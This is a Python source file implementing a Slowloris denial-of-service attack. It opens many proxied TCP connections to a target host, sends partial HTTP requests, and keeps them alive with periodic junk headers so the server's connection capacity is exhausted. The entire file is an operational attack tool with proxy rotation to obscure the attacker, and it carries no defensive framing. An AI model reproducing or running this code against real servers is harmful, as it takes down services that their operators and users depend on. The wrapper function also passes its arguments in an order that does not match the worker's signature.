import random
import threading
import time

import logger
from utils.async_utils import create_async_task
from utils.httpmimic import HTTPMimic
from utils.proxy_parser import get_random_proxy
from utils.socket_utils import create_tcp, parse_target

def run_slowloris(target, method: str, bypass: bool, sockets: int, worker_id: int):
    pad_worker_id = str(worker_id).rjust(2, "0")
    connected_sockets = []
    
    host = target["host"]
    port = target["port"]
    path = target["path"]
    raw_target = f"{host}:{port}"

    def connect_socket():
        prefix = f"[Worker-{pad_worker_id} | RawSocket]  "
        random_proxy = get_random_proxy()
        
        try:
            socket = create_tcp(raw_target, random_proxy)
            socket.settimeout(1)
            client = HTTPMimic(socket, bypass)
            prefix = f"[Worker-{pad_worker_id} | Socket-{client.id}]  "
            client.send_version(method, path)
            client.send_headers(host)
            connected_sockets.append(client)
            logger.info(f"{prefix} Sending <lmagenta>Slowloris<reset> request <lcyan>(proxy={random_proxy}) <reset>to <lgreen>{raw_target}")
            return True
        except Exception as e:
            logger.err(f"{prefix} <lred>Error: {e}<reset>")
            return False
    
    for _ in range(sockets):
        connect_socket()
        
    time.sleep(2)
    
    while True:
        for i, client in enumerate(connected_sockets):
            prefix = f"[Worker-{pad_worker_id} | Socket-{client.id}]  "
            try:
                client.send_header("X-a", f"{random.randint(1, 1000000)}")
            except Exception as e:
                logger.warn(f"{prefix} <lyellow>Target drop connection: {e}<reset>")
                connected_sockets.remove(client)
                continue
            
        connected = len(connected_sockets)
        if connected < sockets:
            for i in range(sockets - connected):
                connect_socket()
        
        time.sleep(2)

def async_run_slowloris(threads: int, raw_target: str, bypass: bool, method: str, sockets: int):   
    target = parse_target(raw_target)
    create_async_task(threads, run_slowloris, (target, bypass, method, sockets))